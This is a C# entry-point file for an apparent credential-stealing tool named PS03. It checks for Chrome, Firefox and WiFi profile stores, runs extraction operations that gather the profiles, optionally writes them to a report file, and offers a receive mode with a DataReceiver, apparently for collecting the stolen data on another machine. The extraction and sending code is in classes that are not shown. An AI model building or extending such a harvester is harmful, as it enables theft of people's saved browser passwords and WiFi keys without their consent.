﻿using PS03.CommandLineOptions;
using PS03.PostOperations;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PS03
{
    public class Program
    {
        static void Main(string[] args)
        {
            var sw = new Stopwatch();
            sw.Start();
            // Variables
            var _options = new Options();
            var _presenter = new Presentation.Presenter();
            IPrinter fp = new FilePrinter();
            DataFormatter rp = new ReportFormatter();

            _options.HandleArgs(args);
            _presenter.ShowWelcome();


            if(!_options.Receive)
            {
                List<ITarget> _targets = new List<ITarget>();
                List<ITarget> _PotentialTargets = new List<ITarget>()
                {
                   new Chrome(),
                   new Firefox(),
                   new WiFi()
                };

                // Locate files and add to targetlist
                foreach (var target in _PotentialTargets)
                {
                    if (target.CheckFile())
                    {
                        if(_options.Verbose)
                            Console.WriteLine(target.Name + " is located.");
                        _targets.Add(target);
                    }
                    else
                    {
                        if (_options.Verbose)
                            Console.WriteLine(target.Name + " failed to locate.");

                    }
                }

                var operations = new Operations.Operations(_targets);
                ConcurrentBag<Profile> profiles = operations.ExecuteOperations(_options);
                
                if(_options.Log)
                {
                    var ProfList = new List<Profile>();
                    foreach (var p in profiles)
                    {
                        ProfList.Add(p);   
                    }


                    var formatted = rp.Format(ProfList);
                    fp.Print(formatted);

                }
            }
            else
            {
                var datareceiver = new DataReceiver(_options);
                datareceiver.BeginReceive();
            }


            sw.Stop();
            if (_options.Verbose)
                Console.WriteLine("Time: " + sw.Elapsed);
        }
    }
}
